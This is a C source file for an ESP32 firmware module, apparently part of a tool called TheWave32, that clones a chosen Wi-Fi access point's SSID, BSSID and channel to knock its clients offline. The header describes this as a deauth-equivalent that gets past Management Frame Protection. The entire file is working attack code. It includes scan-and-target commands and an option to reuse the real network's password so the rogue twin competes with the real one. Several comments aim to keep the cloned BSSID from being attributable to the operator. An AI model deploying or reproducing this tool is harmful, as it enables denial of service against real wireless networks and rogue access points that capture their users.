/*
 * TheWave32 / wifi-bssid-clone
 *
 * Clones a target Wi-Fi AP's SSID + BSSID + channel. Two identical APs
 * coexisting on-channel cause clients to oscillate between them and
 * eventually drop the connection — a Management-Frame-Protection-
 * resistant equivalent of a deauth attack, since no unprotected mgmt
 * frames are ever sent.
 *
 * The trick is `esp_wifi_set_mac(WIFI_IF_AP, target_bssid)` before
 * `esp_wifi_start`. The radio then beacons with the cloned BSSID.
 */

#include <inttypes.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "esp_event.h"
#include "esp_mac.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"

#include "tw32_ap_security.h"
#include "tw32_cdc_cli.h"
#include "tw32_io.h"
#include "tw32_json_out.h"
#include "tw32_nvs_kv.h"
#include "tw32_wifi_scan.h"

#define MODULE_NAME    "wifi-bssid-clone"
#define MODULE_VERSION "0.1.0"

#define MAX_SSID_LEN 32

typedef struct {
    char     ssid[MAX_SSID_LEN + 1];
    uint8_t  ssid_len;
    uint8_t  bssid[6];
    uint8_t  channel;
    bool     have_target;
    /* Cloning open won't fool clients of a WPA2 AP — they'll roam back
     * to the legitimate one. Letting the user set the same PSK as the
     * real network makes the twin actually competitive. */
    tw32_ap_security_t sec;
    volatile bool running;
    /* Cached factory AP MAC, captured once at boot from eFuse so we can
     * restore it on `stop` and on error-recovery paths in `start`. Without
     * this the SoftAP would keep beaconing the cloned BSSID on the
     * harmless stub SSID after a botched start or after a clean stop,
     * which leaks the operator's intent and confuses subsequent runs. */
    uint8_t factory_ap_mac[6];
    bool    factory_ap_mac_valid;
} state_t;

static state_t s_state = { .channel = 1 };

static int parse_mac(const char *s, uint8_t mac[6])
{
    /* Defensive format check: some libc sscanf implementations accept
     * malformed inputs ("nomac" was happily parsed as 0:0:0:0:0:0 in
     * testing). Insist on the canonical aa:bb:cc:dd:ee:ff layout. */
    if (s == NULL || strlen(s) != 17) return -1;
    for (int i = 2; i <= 14; i += 3) {
        if (s[i] != ':') return -1;
    }
    int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++) {
        if (v[i] < 0 || v[i] > 0xFF) return -1;
        mac[i] = (uint8_t)v[i];
    }
    return 0;
}

static void mac_to_str(const uint8_t *m, char *out, size_t n)
{
    snprintf(out, n, "%02x:%02x:%02x:%02x:%02x:%02x",
             m[0], m[1], m[2], m[3], m[4], m[5]);
}

static void wifi_init(void)
{
    { esp_err_t _e = esp_event_loop_create_default();
      if (_e != ESP_OK && _e != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(_e); }
    ESP_ERROR_CHECK(esp_netif_init());
    esp_netif_create_default_wifi_ap();
    esp_netif_create_default_wifi_sta();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    /* Snapshot the eFuse-derived SoftAP MAC before we ever touch it via
     * esp_wifi_set_mac, so stop/error-recovery paths can put it back.
     * esp_read_mac with ESP_MAC_WIFI_SOFTAP returns the chip's default
     * SoftAP MAC regardless of wifi state. */
    if (esp_read_mac(s_state.factory_ap_mac, ESP_MAC_WIFI_SOFTAP) == ESP_OK) {
        s_state.factory_ap_mac_valid = true;
    }
    /* APSTA so we can scan via STA before cloning. AP runs with stub
     * SSID until `start` swaps in the target's BSSID + SSID. */
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    wifi_config_t stub = {0};
    stub.ap.ssid[0]    = '_';
    stub.ap.ssid_len   = 1;
    stub.ap.channel    = 1;
    stub.ap.authmode   = WIFI_AUTH_OPEN;
    stub.ap.max_connection = 4;
    stub.ap.beacon_interval = 100;
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &stub));
    ESP_ERROR_CHECK(esp_wifi_start());
    esp_wifi_set_ps(WIFI_PS_NONE);
}

static int cmd_scan(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c; (void)argc; (void)argv;
    if (tw32_wifi_scan_run() < 0) {
        tw32_cli_ack_err("scan", "scan_failed");
        return -1;
    }
    return 0;
}

static int cmd_target(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2) {
        tw32_cli_ack_err("target", "usage: target <N> | target <bssid> <ssid> <chan>");
        return -1;
    }
    /* `target <N>` — pull bssid + ssid + channel from scan cache. */
    if (argc == 2) {
        tw32_ap_entry_t entry;
        if (!tw32_wifi_scan_resolve_index(argv[1], &entry)) {
            tw32_cli_ack_err("target", "bad_index"); return -1;
        }
        size_t L = strlen(entry.ssid);
        if (L == 0 || L > MAX_SSID_LEN) {
            tw32_cli_ack_err("target", "bad_ssid_len"); return -1;
        }
        /* The MFP-resistant clone DoS requires (SSID,BSSID,channel)
         * identical to the legitimate AP on a valid 2.4 GHz channel. The
         * SoftAP radio only supports 1..14, and the upper edge varies by
         * regulatory domain: refuse anything outside that range rather
         * than fail later in esp_wifi_set_config. */
        if (entry.channel < 1 || entry.channel > 14) {
            tw32_cli_ack_err("target", "bad_channel"); return -1;
        }
        memcpy(s_state.bssid, entry.bssid, 6);
        memcpy(s_state.ssid, entry.ssid, L);
        s_state.ssid[L] = '\0';
        s_state.ssid_len = (uint8_t)L;
        s_state.channel = entry.channel;
        s_state.have_target = true;
        char bssid_str[18];
        mac_to_str(s_state.bssid, bssid_str, sizeof(bssid_str));
        tw32_json_begin();
        tw32_json_kv_str("cmd", "target");
        tw32_json_kv_bool("ok", true);
        tw32_json_kv_str("ssid", s_state.ssid);
        tw32_json_kv_str("bssid", bssid_str);
        tw32_json_kv_int("channel", s_state.channel);
        tw32_json_end();
        return 0;
    }
    /* `target <bssid> <ssid> <chan>` — explicit. Stage into locals first
     * so a validation failure on argv[2..3] cannot leave s_state.bssid
     * half-overwritten (the old code parsed the MAC directly into the
     * live state struct and then validated SSID length / channel, which
     * corrupted the previous target on bad input). */
    if (argc < 4) {
        tw32_cli_ack_err("target", "usage: target <N> | target <bssid> <ssid> <chan>");
        return -1;
    }
    uint8_t new_bssid[6];
    if (parse_mac(argv[1], new_bssid) != 0) {
        tw32_cli_ack_err("target", "bad_bssid"); return -1;
    }
    size_t L = strlen(argv[2]);
    if (L == 0 || L > MAX_SSID_LEN) {
        tw32_cli_ack_err("target", "bad_ssid_len"); return -1;
    }
    long ch = strtol(argv[3], NULL, 10);
    if (ch < 1 || ch > 14) {
        tw32_cli_ack_err("target", "bad_channel"); return -1;
    }
    memcpy(s_state.bssid, new_bssid, 6);
    memcpy(s_state.ssid, argv[2], L);
    s_state.ssid[L] = '\0';
    s_state.ssid_len = (uint8_t)L;
    s_state.channel = (uint8_t)ch;
    s_state.have_target = true;
    tw32_cli_ack_ok("target");
    return 0;
}

static int cmd_start(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c; (void)argc; (void)argv;
    if (!s_state.have_target) { tw32_cli_ack_err("start", "no_target"); return -1; }
    /* IEEE Std 802-2014 §8.2: the least-significant bit of the first
     * octet of a 48-bit MAC is the I/G (individual/group) bit. A BSSID
     * must be an individual address, so that bit MUST be 0. Multicast
     * BSSIDs are not just invalid: esp_wifi_set_mac rejects them with
     * ESP_ERR_INVALID_ARG, but we catch it here for a clearer ack. */
    if (s_state.bssid[0] & 0x01) {
        tw32_cli_ack_err("start", "bssid_multicast"); return -1;
    }
    /* esp_wifi_set_mac requires the interface stopped (ESP-IDF API
     * reference: "must be called after esp_wifi_init() and before
     * esp_wifi_start()"; calling it on a started interface returns
     * ESP_ERR_WIFI_IF). esp_netif stays up across this so STA-side
     * scanning works again as soon as we restart. */
    esp_wifi_stop();

    /* Build the AP config up-front so we can fail cleanly before we
     * have mutated the radio MAC. tw32_ap_security_apply only inspects
     * the security state: it doesn't depend on the radio being stopped,
     * so it's safe to call here. */
    wifi_config_t ap = {0};
    memcpy(ap.ap.ssid, s_state.ssid, s_state.ssid_len);
    ap.ap.ssid_len        = s_state.ssid_len;
    ap.ap.channel         = s_state.channel;
    ap.ap.max_connection  = 4;
    ap.ap.beacon_interval = 100;
    if (tw32_ap_security_apply(&s_state.sec, &ap) != ESP_OK) {
        esp_wifi_start();
        tw32_cli_ack_err("start", "no_password"); return -1;
    }

    if (esp_wifi_set_mac(WIFI_IF_AP, s_state.bssid) != ESP_OK) {
        esp_wifi_start();
        tw32_cli_ack_err("start", "set_mac_failed"); return -1;
    }
    if (esp_wifi_set_config(WIFI_IF_AP, &ap) != ESP_OK) {
        /* The MAC has already been swapped to the target's BSSID. If we
         * just restart now the SoftAP will beacon the OLD stub SSID on
         * the cloned BSSID: visible, attributable, and not what the
         * operator asked for. Roll the MAC back to factory before the
         * restart. */
        if (s_state.factory_ap_mac_valid) {
            (void)esp_wifi_set_mac(WIFI_IF_AP, s_state.factory_ap_mac);
        }
        esp_wifi_start();
        tw32_cli_ack_err("start", "config_failed"); return -1;
    }
    if (esp_wifi_start() != ESP_OK) {
        /* Radio is now stopped with a cloned MAC + cloned SSID staged.
         * Try once more after restoring factory MAC + stub config so we
         * don't leave the device in a permanently broken state. Best
         * effort: if the restart still fails the user can power-cycle. */
        if (s_state.factory_ap_mac_valid) {
            (void)esp_wifi_set_mac(WIFI_IF_AP, s_state.factory_ap_mac);
        }
        wifi_config_t stub = {0};
        stub.ap.ssid[0]    = '_';
        stub.ap.ssid_len   = 1;
        stub.ap.channel    = 1;
        stub.ap.authmode   = WIFI_AUTH_OPEN;
        stub.ap.max_connection = 4;
        stub.ap.beacon_interval = 100;
        (void)esp_wifi_set_config(WIFI_IF_AP, &stub);
        (void)esp_wifi_start();
        tw32_cli_ack_err("start", "start_failed"); return -1;
    }
    s_state.running = true;
    tw32_cli_ack_ok("start");
    return 0;
}

static int cmd_stop(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c; (void)argc; (void)argv;
    s_state.running = false;
    /* Swap AP back to the inert stub instead of stopping the radio
     * entirely, keeps STA up for subsequent scans. We also restore the
     * factory SoftAP MAC: without this the stub keeps beaconing on the
     * cloned BSSID, which is both attributable to the operator and a
     * cause of confusion on the next `start` (the stop+start cycle
     * inside cmd_start would otherwise see "MAC unchanged" and skip the
     * radio reset on some IDF versions). esp_wifi_set_mac requires the
     * interface stopped, so cycle the radio. */
    if (s_state.factory_ap_mac_valid) {
        esp_wifi_stop();
        (void)esp_wifi_set_mac(WIFI_IF_AP, s_state.factory_ap_mac);
        wifi_config_t stub = {0};
        stub.ap.ssid[0]    = '_';
        stub.ap.ssid_len   = 1;
        stub.ap.channel    = 1;
        stub.ap.authmode   = WIFI_AUTH_OPEN;
        stub.ap.max_connection = 4;
        stub.ap.beacon_interval = 100;
        (void)esp_wifi_set_config(WIFI_IF_AP, &stub);
        (void)esp_wifi_start();
    } else {
        /* Fallback: factory MAC was never captured, just swap the
         * config and live with the cloned BSSID until reboot. */
        wifi_config_t stub = {0};
        stub.ap.ssid[0]    = '_';
        stub.ap.ssid_len   = 1;
        stub.ap.channel    = 1;
        stub.ap.authmode   = WIFI_AUTH_OPEN;
        stub.ap.max_connection = 4;
        (void)esp_wifi_set_config(WIFI_IF_AP, &stub);
    }
    tw32_cli_ack_ok("stop");
    return 0;
}

/* Thin wrappers over the shared tw32_ap_security_* helpers. */
static int cmd_password(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    char err[TW32_AP_ERROR_SIZE] = {0};
    const char *arg = argc >= 2 ? argv[1] : NULL;
    if (tw32_ap_security_set_password(&s_state.sec, arg, err) == 0)
        tw32_cli_ack_ok("password");
    else
        tw32_cli_ack_err("password", err);
    return 0;
}

static int cmd_auth(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    char err[TW32_AP_ERROR_SIZE] = {0};
    const char *arg = argc >= 2 ? argv[1] : NULL;
    if (tw32_ap_security_set_auth(&s_state.sec, arg, err) == 0)
        tw32_cli_ack_ok("auth");
    else
        tw32_cli_ack_err("auth", err);
    return 0;
}

static int cmd_hidden(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    char err[TW32_AP_ERROR_SIZE] = {0};
    const char *arg = argc >= 2 ? argv[1] : NULL;
    if (tw32_ap_security_set_hidden(&s_state.sec, arg, err) == 0)
        tw32_cli_ack_ok("hidden");
    else
        tw32_cli_ack_err("hidden", err);
    return 0;
}

static int cmd_stats(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c; (void)argc; (void)argv;
    char bssid_str[18] = "00:00:00:00:00:00";
    if (s_state.have_target) mac_to_str(s_state.bssid, bssid_str, sizeof(bssid_str));
    tw32_json_begin();
    tw32_json_kv_str ("cmd", "stats");
    tw32_json_kv_bool("ok", true);
    tw32_json_kv_str ("bssid",   bssid_str);
    tw32_json_kv_str ("ssid",    s_state.have_target ? s_state.ssid : "");
    tw32_json_kv_int ("channel", s_state.channel);
    tw32_ap_security_emit_stats(&s_state.sec);
    tw32_json_kv_bool("running",      s_state.running);
    tw32_json_end();
    return 0;
}

static const tw32_cli_cmd_t cli_table[] = {
    { "scan",     "list nearby APs",                          cmd_scan     },
    { "target",   "target <N> | target <bssid> <ssid> <chan>",cmd_target   },
    { "password", "password <pwd|clear> (8..63 ASCII)",       cmd_password },
    { "auth",     "auth <open|wpa2>",                         cmd_auth     },
    { "hidden",   "hidden <on|off>",                          cmd_hidden   },
    { "start",    "raise twin AP",                            cmd_start    },
    { "stop",     "halt twin AP",                             cmd_stop     },
    { "stats",    "AP state",                                 cmd_stats    },
};

void app_main(void)
{
    tw32_nvs_init();
    tw32_cdc_init();
    wifi_init();
    tw32_wifi_scan_init();
    tw32_cli_run(MODULE_NAME, MODULE_VERSION,
                 cli_table, sizeof(cli_table) / sizeof(cli_table[0]));
}
